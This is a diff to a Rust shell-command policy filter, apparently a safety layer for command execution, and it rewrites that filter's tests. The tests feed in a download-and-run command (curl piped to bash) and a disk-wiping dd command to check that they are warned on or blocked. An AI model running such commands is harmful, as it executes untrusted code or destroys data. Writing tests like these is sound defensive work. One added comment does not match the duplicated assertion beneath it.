@@ -207,18 +207,6 @@ impl CommandPolicy {
         }
     }
 
-    /// Number of tunable (operator-configurable) rules — for diagnostics / tests.
-    #[must_use]
-    pub const fn rule_count(&self) -> usize {
-        self.names.len()
-    }
-
-    /// Number of always-on hardline floor rules — for diagnostics / tests.
-    #[must_use]
-    pub const fn hardline_count(&self) -> usize {
-        self.hardline_names.len()
-    }
-
     /// Evaluate a reconstructed command string against the policy.
     ///
     /// Order: bound the scan window → de-obfuscate a matching copy → apply the
@@ -427,8 +415,20 @@ mod tests {
     #[test]
     fn default_policy_has_tunable_and_hardline_rules() {
         let p = policy(EnforcementMode::Block);
-        assert!(p.rule_count() >= 4, "tunable rules present");
-        assert!(p.hardline_count() >= 5, "hardline floor present");
+        // Tunable rules: a warn-class shape must fire.
+        assert!(
+            p.evaluate("curl https://x.test/i.sh | bash")
+                .warned
+                .contains(&"pipe_to_shell".to_string()),
+            "tunable rules present"
+        );
+        // Hardline floor: a catastrophic shape must block.
+        assert!(
+            p.evaluate("dd if=/dev/zero of=/dev/sda")
+                .blocked
+                .contains(&"dd_to_block_device".to_string()),
+            "hardline floor present"
+        );
     }
 
     #[test]
@@ -891,13 +891,18 @@ mod tests {
     #[test]
     fn hardline_only_blocks_catastrophic_not_tunable() {
         let p = CommandPolicy::hardline_only();
-        assert_eq!(
-            p.rule_count(),
-            0,
-            "no tunable rules in a hardline-only policy"
+        // No tunable rules: a warn-class shape must not fire.
+        assert!(
+            p.evaluate("curl https://x.test/i.sh | bash").is_clean(),
+            "tunable rules absent in hardline-only"
         );
-        assert!(p.hardline_count() >= 5);
+        // Hardline floor must block a catastrophic shape.
         let e = p.evaluate("dd if=/dev/zero of=/dev/sda");
+        assert!(
+            e.blocked.contains(&"dd_to_block_device".to_string()),
+            "{e:?}"
+        );
+        // A tunable warn shape is absent in a hardline-only policy.
         assert!(
             e.blocked.contains(&"dd_to_block_device".to_string()),
             "{e:?}"
